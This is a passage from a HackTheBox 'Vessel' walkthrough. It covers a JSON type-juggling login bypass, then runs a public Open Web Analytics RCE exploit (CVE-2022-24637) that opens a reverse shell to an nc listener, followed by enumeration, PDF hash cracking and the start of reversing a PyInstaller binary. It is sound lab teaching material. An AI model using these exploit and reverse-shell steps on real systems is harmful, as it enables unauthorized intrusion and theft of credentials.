+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/register'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'register'</span><span class="mtk1">, { </span><span class="mtk1">registered</span><span class="mtk1"> : </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk8">flash</span><span class="mtk1">(</span><span class="mtk4">'error'</span><span class="mtk1">) });</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/reset'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'reset'</span><span class="mtk1">, { </span><span class="mtk1">reset</span><span class="mtk1"> : </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk8">flash</span><span class="mtk1">(</span><span class="mtk4">'error'</span><span class="mtk1">) });</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk4">'/401'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">,</span><span class="mtk9 mtki">res</span><span class="mtk1">){</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'401'</span><span class="mtk1">);</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk4">'/500'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">,</span><span class="mtk9 mtki">res</span><span class="mtk1">){</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'500'</span><span class="mtk1">);</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk4">'/404'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">,</span><span class="mtk9 mtki">res</span><span class="mtk1">){</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'404'</span><span class="mtk1">);</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/logout'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.session) {</span>
+<span class="mtk1">      </span><span class="mtk9 mtki">req</span><span class="mtk1">.session.</span><span class="mtk8">destroy</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">err</span><span class="mtk1">) {</span>
+<span class="mtk1">          </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/500'</span><span class="mtk1">);</span>
+<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">          </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">      });</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">      </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/register'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk8">flash</span><span class="mtk1">(</span><span class="mtk4">'error'</span><span class="mtk1">, </span><span class="mtk4">'Currently not available!'</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/register'</span><span class="mtk1">);</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/reset'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk8">flash</span><span class="mtk1">(</span><span class="mtk4">'error'</span><span class="mtk1">, </span><span class="mtk4">'Currently not available!'</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/reset'</span><span class="mtk1">);</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/login'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.username;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.password;</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk1">connection</span><span class="mtk1">.</span><span class="mtk8">query</span><span class="mtk1">(</span><span class="mtk4">'SELECT * FROM accounts WHERE username = ? AND pas</span><span class="mtk4">sword = ?'</span><span class="mtk1">, [</span><span class="mtk1">username</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1">], </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">error</span><span class="mtk1">, </span><span class="mtk9 mtki">results</span><span class="mtk1">, </span><span class="mtk9 mtki">fields</span><span class="mtk1">) {</span>  
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">error</span><span class="mtk1">) </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk9 mtki">error</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">results</span><span class="mtk1">.length </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk9 mtki">req</span><span class="mtk1">.session.loggedin </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk9 mtki">req</span><span class="mtk1">.session.username </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">username</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk8">flash</span><span class="mtk1">(</span><span class="mtk4">'success'</span><span class="mtk1">, </span><span class="mtk4">'Succesfully logged in!'</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/admin'</span><span class="mtk1">);</span>
+<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk8">flash</span><span class="mtk1">(</span><span class="mtk4">'error'</span><span class="mtk1">, </span><span class="mtk4">'Wrong credentials! Try Again!'</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>
+<span class="mtk1">      }     </span>
+<span class="mtk1">      </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">end</span><span class="mtk1">();</span>
+<span class="mtk1">    });</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/admin'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.session.loggedin) {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'admin'</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">end</span><span class="mtk1">();</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/notes'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.session.loggedin) {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'notes'</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/401'</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">end</span><span class="mtk1">();</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/charts'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.session.loggedin) {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'charts'</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/401'</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">end</span><span class="mtk1">();</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/tables'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.session.loggedin) {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'tables'</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/401'</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">end</span><span class="mtk1">();</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">all</span><span class="mtk1">(</span><span class="mtk4">'*'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">404</span><span class="mtk1">);    </span>
+<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/404'</span><span class="mtk1">);</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">module</span><span class="mtk1">.</span><span class="mtk1">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">router</span><span class="mtk1">;</span>
+</code></pre></div><p>Particularly, we are interested in the login functionality, so let&rsquo;s focus on <code>/api/login</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/login'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.username;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.password;</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk1">connection</span><span class="mtk1">.</span><span class="mtk8">query</span><span class="mtk1">(</span><span class="mtk4">'SELECT * FROM accounts WHERE username = ? AND pas</span><span class="mtk4">sword = ?'</span><span class="mtk1">, [</span><span class="mtk1">username</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1">], </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">error</span><span class="mtk1">, </span><span class="mtk9 mtki">results</span><span class="mtk1">, </span><span class="mtk9 mtki">fields</span><span class="mtk1">) {</span>  
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">error</span><span class="mtk1">) </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk9 mtki">error</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">results</span><span class="mtk1">.length </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk9 mtki">req</span><span class="mtk1">.session.loggedin </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk9 mtki">req</span><span class="mtk1">.session.username </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">username</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk8">flash</span><span class="mtk1">(</span><span class="mtk4">'success'</span><span class="mtk1">, </span><span class="mtk4">'Succesfully logged in!'</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/admin'</span><span class="mtk1">);</span>
+<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk8">flash</span><span class="mtk1">(</span><span class="mtk4">'error'</span><span class="mtk1">, </span><span class="mtk4">'Wrong credentials! Try Again!'</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>
+<span class="mtk1">      }     </span>
+<span class="mtk1">      </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">end</span><span class="mtk1">();</span>
+<span class="mtk1">    });</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">});</span>
+</code></pre></div><p>The SQL query seems to be safe because it uses prepared statements. However, this part reminded me to <a href="../../ctf/htb-challenges/web/spiky-tamagotchi">Spiky Tamagotchi</a>. In fact, it is possible to bypass the above query using a kind of Type Juggling with JSON encoding.</p><h2 id="foothold">Foothold</h2><p>First of all, let&rsquo;s use Burp Suite to capture the login request and then use the Repeater tab:</p><p><img src="/images/HTB/Vessel/Vessel-5.png" alt="Vessel 5"></p><p>Now, let&rsquo;s change the content to JSON:</p><p><img src="/images/HTB/Vessel/Vessel-6.png" alt="Vessel 6"></p><h3 id="authentication-bypass">Authentication bypass</h3><p>The server accepts JSON, so everything is good for the moment. At this point, we can trigger the Type Juggling exploit:</p><p><img src="/images/HTB/Vessel/Vessel-7.png" alt="Vessel 7"></p><p>The problem is better explained at <a href="../../ctf/htb-challenges/web/spiky-tamagotchi">Spiky Tamagotchi</a>, where I show that the bypass actually happens in MySQL.</p><p>At this point, we can bypass authentication and see the administration panel:</p><p><img src="/images/HTB/Vessel/Vessel-8.png" alt="Vessel 8"></p><h3 id="exploiting-a-cve">Exploiting a CVE</h3><p>If we look at the top-right dropdown, we will find a subdomain (<code>openwebanalytics.vessel.htb</code>):</p><p><img src="/images/HTB/Vessel/Vessel-9.png" alt="Vessel 9"></p><p>After setting the subdomain in <code>/etc/hosts</code>, we have this web application:</p><p><img src="/images/HTB/Vessel/Vessel-10.png" alt="Vessel 10"></p><p>Reading the HTML source code, one can find that it is using Open Web Analytics version 1.7.3:</p><p><img src="/images/HTB/Vessel/Vessel-11.png" alt="Vessel 11"></p><p>Actually, there is a <a href="https://www.exploit-db.com/exploits/51026">public exploit for this version</a>, which is related to <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24637">CVE-2022-24637</a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">searchsploit</span> analytics 1.7.3
+------------------------------------------------- ----------------------  
+Exploit Title                                    | Path
+------------------------------------------------- ----------------------
+Open Web <span class="code-red">Analytics</span> <span class="code-red">1.7.3</span> - Remote Code Execution | php/webapps/51026.py
+------------------------------------------------- ----------------------
+Shellcodes: No Results
+</code></pre></div><p>If we run it, we will get a shell with <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">51026.py</span>
+usage: 51026.py [-h] [-u USERNAME] [-p PASSWORD] [-P PROXY] [-c] TARGET ATTACKER_IP ATTACKER_PORT
+51026.py: error: the following arguments are required: TARGET, ATTACKER_IP, ATTACKER_PORT
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">51026.py</span> http://openwebanalytics.vessel.htb 10.10.17.44 4444
+[<span class="code-dark-green">SUCCESS</span>] Connected to "http://openwebanalytics.vessel.htb/" successfully!
+[<span class="code-dark-yellow">ALERT</span>] The webserver indicates a vulnerable version!
+[<span class="code-dark-blue">INFO</span>] Attempting to generate cache for "admin" user
+[<span class="code-dark-blue">INFO</span>] Attempting to find cache of "admin" user
+[<span class="code-dark-blue">INFO</span>] Found temporary password for user "admin": c2304eea67bac6c8c2b766220bb02e6c
+[<span class="code-dark-blue">INFO</span>] Changed the password of "admin" to "LV6HaAZ71Zl8j01VCC1CTm28o0HhDbbu"
+[<span class="code-dark-green">SUCCESS</span>] Logged in as "admin" user
+[<span class="code-dark-blue">INFO</span>] Creating log file
+[<span class="code-dark-blue">INFO</span>] Wrote payload to log file
+[<span class="code-dark-green">SUCCESS</span>] Triggering payload! Check your listener!
+[<span class="code-dark-blue">INFO</span>] You can trigger the payload again at "http://openwebanalytics.vessel.htb/owa-data/caches/ROvAfn4B.php"  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.178.
+Ncat: Connection from 10.10.11.178:55562.
+whoami
+www-data
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@vessel:/var/www/html/owa/owa-data/caches$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+www-data@vessel:/var/www/html/owa/owa-data/caches$ export TERM=xterm
+www-data@vessel:/var/www/html/owa/owa-data/caches$ export SHELL=bash
+www-data@vessel:/var/www/html/owa/owa-data/caches$ stty rows 50 columns 158  
+</code></pre></div><h2 id="system-enumeration">System enumeration</h2><p>There are two users in the machine:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@vessel:/var/www/html/owa/owa-data/caches$ ls /home  
+ethan  steven
+</code></pre></div><p>And we are able to access these files from <code>steven</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@vessel:/var/www/html/owa/owa-data/caches$ find /home  
+/home
+/home/steven
+/home/steven/passwordGenerator
+/home/steven/.bashrc
+/home/steven/.notes
+/home/steven/.notes/screenshot.png
+/home/steven/.notes/notes.pdf
+/home/steven/.profile
+/home/steven/.bash_logout
+/home/steven/.bash_history
+/home/ethan
+find: '/home/ethan': Permission denied
+</code></pre></div><p>These files are interesting:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@vessel:/var/www/html/owa/owa-data/caches$ file /home/steven/passwordGenerator
+/home/steven/passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows
+www-data@vessel:/var/www/html/owa/owa-data/caches$ file /home/steven/.notes/screenshot.png
+/home/steven/.notes/screenshot.png: PNG image data, 548 x 427, 8-bit/color RGB, non-interlaced  
+www-data@vessel:/var/www/html/owa/owa-data/caches$ file /home/steven/.notes/notes.pdf
+/home/steven/.notes/notes.pdf: PDF document, version 1.6
+</code></pre></div><p>We can transfer them to our machine and analyze them.</p><h3 id="reversing-a-windows-pe">Reversing a Windows PE</h3><p>The file <code>screenshot.png</code> is this:</p><p><img src="/images/HTB/Vessel/Vessel-12.png" alt="Vessel 12"></p><p>It shows a Desktop application to generate &ldquo;secure and random&rdquo; passwords. The PDF document is password-protected, so we can guess that the password that appears masked in the screenshot is the one used in the PDF document.</p><p>Using <code>pdf2john</code> we can extract a hash and then try to crack it with <code>john</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">pdf2john</span> <span class="mtku">notes.pdf</span> | <span class="code-dark-green">tee</span> hash
+notes.pdf:$pdf$2*3*128*-1028*1*16*c19b3bb1183870f00d63a766a1f80e68*32*4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000*32*cf30caf66ccc3eabfaf3  
+71623215bb8f004d7b8581d68691ca7b800345bc9a86
+</code></pre></div><p>Obviously, the password is not in <code>rockyou.txt</code>. Hence, we will need to reverse-engineer the Windows PE file and find out how the passwords are generated.</p><p>If we look the strings of the file, we can find some references to Python 3.7:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">strings</span> <span class="mtku">passwordGenerator</span> | <span class="code-dark-green">grep</span> python  
+b<span class="code-red">python</span>3.dll
+b<span class="code-red">python</span>37.dll
+3<span class="code-red">python</span>37.dll
+</code></pre></div><p>Therefore, we can be sure that it is a binary file compiled from Python version 3.7. We can extract the Python bytecode with <a href="https://github.com/extremecoders-re/pyinstxtractor"><code>pyinstxtractor</code></a> and then find the source code with <a href="https://pypi.org/project/uncompyle6/"><code>uncompyle6</code></a>.</p><p>Since there is a specific version involved, let&rsquo;s use a Docker container to extract the source code:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run --rm -v <span class="code-dark-yellow">"<span class="code-dark-cyan">$PWD</span>"</span>:/opt -it python:3.7 bash
+root@b81d5511afb9:/# cd /tmp
+root@b81d5511afb9:/tmp# git clone https://github.com/extremecoders-re/pyinstxtractor
+...
+root@b81d5511afb9:/tmp# pip install uncompyle6
+...
+root@b81d5511afb9:/tmp# python3 /tmp/pyinstxtractor/pyinstxtractor.py /opt/passwordGenerator  
+[+] Processing /opt/passwordGenerator
+[+] Pyinstaller version: 2.1+
+[+] Python version: 3.7
+[+] Length of package: 34300131 bytes
+[+] Found 95 files in CArchive
+[+] Beginning extraction...please standby
